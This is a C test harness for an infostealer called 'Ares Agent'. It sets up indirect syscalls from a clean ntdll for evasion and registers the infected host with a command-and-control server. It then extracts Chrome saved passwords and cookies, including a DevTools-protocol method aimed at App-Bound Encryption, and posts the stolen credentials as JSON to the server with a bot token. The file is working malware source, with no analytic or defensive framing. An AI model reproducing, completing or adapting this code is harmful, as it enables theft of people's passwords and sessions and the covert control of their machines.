/*
 * Ares Agent — Full Test (console + skip sandbox)
 * Runs the full agent flow: init → register → auto-steal → exfil
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "ares_agent.h"
#include "ares_resolve.h"
#include "ares_strings.h"
/* #include <shlobj.h> — v3.0: removed, CSIDL_ defined in ares_resolve.h */

/* Override sandbox check for testing */
BOOL Ares_CheckSandbox_OVERRIDE = FALSE;

/* Global bot ID (referenced by socks5.c / hvnc.c — defined in main.c normally) */
char g_bot_id_global[64] = {0};

int main()
{
    printf("=== ARES FULL AGENT TEST (v2.2 — Console) ===\n\n");

    /* Phase 0: Manual init (skip sandbox) */
    AGENT_STATE state;
    memset(&state, 0, sizeof(AGENT_STATE));
    state.running = TRUE;
    state.pid = GetCurrentProcessId();
    DWORD sz = sizeof(state.hostname);
    GetComputerNameA(state.hostname, &sz);
    sz = sizeof(state.username);
    GetUserNameA(state.username, &sz);
    printf("[*] Host: %s | User: %s | PID: %lu\n", state.hostname, state.username, state.pid);

    /* Skip sandbox check */
    printf("[*] Sandbox check: SKIPPED (testing)\n");

    /* Phase 0.3: Syscall Engine Init (required for chrome injection) */
    printf("[*] Initializing syscall engine...\n");
    printf("    Reading clean ntdll from System32...\n");
    if (!Ares_ResolveSyscalls(&state)) {
        printf("[!] SSN resolution FAILED! Continuing without injection...\n");
    } else {
        printf("    [+] SSNs resolved (18 syscalls from clean ntdll)\n");
        /* Build all stubs needed by chrome_inject.c */
        printf("    Building indirect syscall stubs...\n");
        /* Stubs are built lazily on first call, but we must finalize after */
        Ares_FinalizeSyscallStubs(&state);
        printf("    [+] Syscall stubs ready (W^X: RW->RX)\n");
    }

    /* Phase 0.5: Resolve APIs */
    printf("[*] Resolving runtime APIs...\n");
    if (!Ares_ResolveAPIs()) {
        printf("[!] API resolution FAILED!\n");
        return 1;
    }
    printf("[+] All APIs resolved\n\n");

    /* Phase 0.7: ChromeKatz scan DISABLED
     * Confirmed: ALL 200 passwords are v20 (no v10 entries at all)
     * v20 AES key is never stored in plaintext in chrome.exe memory
     * Memory scan approach not applicable for this Chrome version */
    if (state.clean_ntdll) {
        printf("=== V20 STATUS ===\n");
        printf("[*] All passwords use v20 App-Bound Encryption\n");
        printf("[*] ChromeKatz scan: SKIPPED (no v10 entries for key validation)\n");
        printf("[*] CDP non-destructive extract: ACTIVE\n");
        printf("=== END V20 STATUS ===\n\n");
    }

    /* Phase 1: Register with C2 */
    printf("[*] Registering with C2 (127.0.0.1:8443)...\n");
    strncpy(state.config.c2_endpoints[0], "127.0.0.1", 255);
    state.config.c2_count = 1;
    state.config.sleep_ms = 5000;
    int c2_port = 8443;

    /* Build registration JSON */
    char json[2048];
    int n = snprintf(json, sizeof(json),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"Windows 10\","
        "\"arch\":\"x64\",\"pid\":%lu,\"admin\":%s,\"version\":\"2.2\"}",
        state.hostname, state.username, state.pid,
        "false"); /* v3.0: admin check deferred to avoid shell32 */

    wchar_t whost[256];
    MultiByteToWideChar(CP_UTF8, 0, "127.0.0.1", -1, whost, 256);

    char s_reg[32]; DEC_C2_REGISTER(s_reg);
    wchar_t wreg[32];
    MultiByteToWideChar(CP_UTF8, 0, s_reg, -1, wreg, 32);

    HINTERNET hSession = p_WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = p_WinHttpConnect(hSession, whost, 8443, 0);
    HINTERNET hRequest = p_WinHttpOpenRequest(hConnect, L"POST", wreg,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    DWORD secFlags = 0x00003300;
    p_WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    p_WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);

    if (!p_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json, n, n, 0) ||
        !p_WinHttpReceiveResponse(hRequest, NULL)) {
        printf("[!] C2 registration failed: %lu\n", GetLastError());
        return 1;
    }

    char respBuf[4096] = {0};
    DWORD avail, rd, total = 0;
    while (p_WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        p_WinHttpReadData(hRequest, respBuf + total, avail, &rd);
        total += rd;
    }
    printf("[+] C2 response: %s\n", respBuf);

    /* Parse bot_id and bot_token from response */
    char bot_id[32] = {0};
    char bot_token[64] = {0};
    char* bid = strstr(respBuf, "\"bot_id\":\"");
    if (bid) { bid += 10; char* end = strchr(bid, '"'); if (end) { int l=(int)(end-bid); if(l<31) memcpy(bot_id, bid, l); } }
    char* btk = strstr(respBuf, "\"bot_token\":\"");
    if (btk) { btk += 13; char* end = strchr(btk, '"'); if (end) { int l=(int)(end-btk); if(l<63) memcpy(bot_token, btk, l); } }
    printf("[+] Bot ID: %s\n", bot_id);
    printf("[+] Token:  %s\n\n", bot_token);

    p_WinHttpCloseHandle(hRequest);
    p_WinHttpCloseHandle(hConnect);
    p_WinHttpCloseHandle(hSession);

    /* Phase 2: Steal & Exfil */
    printf("[*] Phase 2: Stealing credentials...\n");
    DECRYPTED_CRED creds[200];
    int credCount = Ares_StealChromeCreds(creds, 200);
    printf("[+] Credentials: %d\n", credCount);
    int ok_count = 0, v20_count = 0;
    for (int i = 0; i < credCount; i++) {
        if (strcmp(creds[i].decrypt_status, "ok") == 0) ok_count++;
        else if (strcmp(creds[i].decrypt_status, "v20_blocked") == 0) v20_count++;
    }
    printf("    Decrypted: %d | v20_blocked: %d | other: %d\n", ok_count, v20_count, credCount - ok_count - v20_count);
    for (int i = 0; i < credCount && i < 5; i++) {
        printf("  [%d] %s | %s | %s | %s\n", i+1, creds[i].browser, creds[i].url, 
            creds[i].username, creds[i].decrypt_status);
        if (strcmp(creds[i].decrypt_status, "ok") == 0 && strlen(creds[i].password) > 0) {
            int pl = (int)strlen(creds[i].password);
            printf("       pass: %c***%c (%d chars)\n", creds[i].password[0], creds[i].password[pl-1], pl);
        }
    }

    /* Phase 2.5: CDP Autofill — decrypt v20_blocked passwords via Chrome's own autofill */
    if (v20_count > 0) {
        printf("\n[*] Phase 2.5: CDP Autofill extraction (%d v20_blocked)...\n", v20_count);
        extern int Ares_CDP_DecryptPasswords(DECRYPTED_CRED*, int);
        int cdp_ok = Ares_CDP_DecryptPasswords(creds, credCount);
        printf("[+] CDP decrypted: %d / %d\n", cdp_ok, v20_count);

        /* Recount */
        ok_count = 0; v20_count = 0;
        for (int i = 0; i < credCount; i++) {
            if (strcmp(creds[i].decrypt_status, "ok") == 0) ok_count++;
            else if (strcmp(creds[i].decrypt_status, "v20_blocked") == 0) v20_count++;
        }
        printf("    Final: Decrypted: %d | v20_blocked: %d\n", ok_count, v20_count);
        /* Show first few decrypted passwords */
        int shown = 0;
        for (int i = 0; i < credCount && shown < 5; i++) {
            if (strcmp(creds[i].decrypt_status, "ok") == 0 && strlen(creds[i].password) > 0) {
                int pl = (int)strlen(creds[i].password);
                printf("  [%d] %s | %c***%c (%d chars)\n", i+1, creds[i].url, 
                    creds[i].password[0], creds[i].password[pl-1], pl);
                shown++;
            }
        }
    }

    printf("\n[*] Phase 3: Stealing cookies...\n");
    STOLEN_COOKIE* cookies = (STOLEN_COOKIE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 500 * sizeof(STOLEN_COOKIE));
    int cookieCount = Ares_StealChromeCookies(cookies, 500);
    printf("[+] Cookies: %d\n", cookieCount);

    /* Phase 3: Exfil passwords to C2 */
    if (credCount > 0) {
        printf("\n[*] Exfiltrating %d creds to C2...\n", credCount);
        int bufMax = 1024 * 1024;
        char* output = (char*)HeapAlloc(GetProcessHeap(), 0, bufMax);
        int off = snprintf(output, bufMax, "{\"bot_id\":\"%s\",\"type\":\"passwords\",\"count\":%d,\"entries\":[", bot_id, credCount);
        for (int i = 0; i < credCount && off < bufMax - 2048; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off,
                "{\"url\":\"%s\",\"user\":\"%s\",\"pass\":\"%s\",\"browser\":\"%s\",\"status\":\"%s\"}",
                creds[i].url, creds[i].username, creds[i].password, creds[i].browser, creds[i].decrypt_status);
        }
        off += snprintf(output+off, bufMax-off, "]}");

        /* Send exfil */
        char s_exfil[32]; DEC_C2_EXFIL(s_exfil);
        wchar_t wexfil[32];
        MultiByteToWideChar(CP_UTF8, 0, s_exfil, -1, wexfil, 32);

        hSession = p_WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        hConnect = p_WinHttpConnect(hSession, whost, 8443, 0);
        hRequest = p_WinHttpOpenRequest(hConnect, L"POST", wexfil, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        p_WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
        p_WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);

        /* Add X-Bot-Token for auth */
        wchar_t tokenHdr[128]; wchar_t wtoken[64];
        MultiByteToWideChar(CP_UTF8, 0, bot_token, -1, wtoken, 64);
        swprintf(tokenHdr, 128, L"X-Bot-Token: %s", wtoken);
        p_WinHttpAddRequestHeaders(hRequest, tokenHdr, -1, WINHTTP_ADDREQ_FLAG_ADD);

        if (p_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)output, off, off, 0) &&
            p_WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD statusCode = 0, scSize = sizeof(statusCode);
            p_WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &scSize, NULL);
            printf("[+] Exfil status: %lu\n", statusCode);
        } else {
            printf("[!] Exfil failed: %lu\n", GetLastError());
        }
        p_WinHttpCloseHandle(hRequest);
        p_WinHttpCloseHandle(hConnect);
        p_WinHttpCloseHandle(hSession);
        HeapFree(GetProcessHeap(), 0, output);
    }

    HeapFree(GetProcessHeap(), 0, cookies);

    printf("\n=== FULL TEST COMPLETE ===\n");
    printf("Credentials: %d | Cookies: %d\n", credCount, cookieCount);
    printf("Bot ID: %s\n", bot_id);
    return 0;
}
